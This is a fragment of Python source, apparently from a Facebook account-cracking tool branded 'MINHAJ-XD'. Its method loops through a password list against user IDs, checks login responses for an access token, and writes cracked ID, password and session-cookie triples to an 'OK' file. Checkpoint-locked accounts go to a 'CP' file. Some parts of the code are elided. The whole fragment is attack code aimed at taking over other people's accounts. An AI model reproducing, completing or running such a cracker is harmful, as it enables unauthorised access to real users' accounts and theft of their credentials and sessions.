...
class Mr_Code:
    ...
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mMINHAJ-XD {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mMINHAJ-OK • {uid} • {pas}")
                        open("/sdcard/MINHAJ-RNDM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/MINHAJ-RNDM-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
